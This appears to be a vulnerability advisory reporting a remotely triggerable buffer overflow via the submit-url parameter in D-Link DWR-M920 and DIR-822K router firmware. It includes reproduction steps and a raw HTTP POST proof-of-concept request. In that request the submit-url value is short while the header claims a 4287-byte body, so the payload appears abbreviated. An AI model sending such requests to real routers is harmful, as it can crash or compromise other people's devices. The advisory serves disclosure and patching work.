### Overview
vendor: D-Link

product: DWR-M920/Dir-822K

version: V1.1.50/20250513164613

type: Buffer Overflow
### Vulnerability Description
A vulnerability has been found in D-Link DWR-M920 V1.1.50 and Dir-822K 20250513164613. This vulnerability can be triggered through the route /boafrm/formParentControl. The manipulation of the argument submit-url leads to buffer overflow. The attack is possible to be carried out remotely. The exploit has been disclosed to the public and may be used.
### Vulnerability Details
The `sub_423848` function retrieves the `submit-url` parameter from the user request. The parameter is passed to the `strcpy` function without any length check, which may overflow the buffer `byte_4ECC48`.

![](./images/5.png)

### Reproduction
First, visit `http://192.168.0.1/parentcontrol.htm` ，send the `poc`, and then visit `http://192.168.0.1` to trigger the crash.

### POC
```
POST /boafrm/formParentControl HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 4287
Origin: http://192.168.0.1
Connection: keep-alive
Referer: http://192.168.0.1/parentcontrol.htm
Cookie: webuicookie=TBj9VM2ZBHM+aoEpUM8Mp8/W
Upgrade-Insecure-Requests: 1
Priority: u=0, i

mac=&clientList=&comment=&from_hour=0&from_min=0&to_hour=0&to_min=0&day_value=&from_hour_value=&to_hour_value=&addParentControlFlag=1&save_apply=Save+%26+Apply&submit-url=%.htm
```
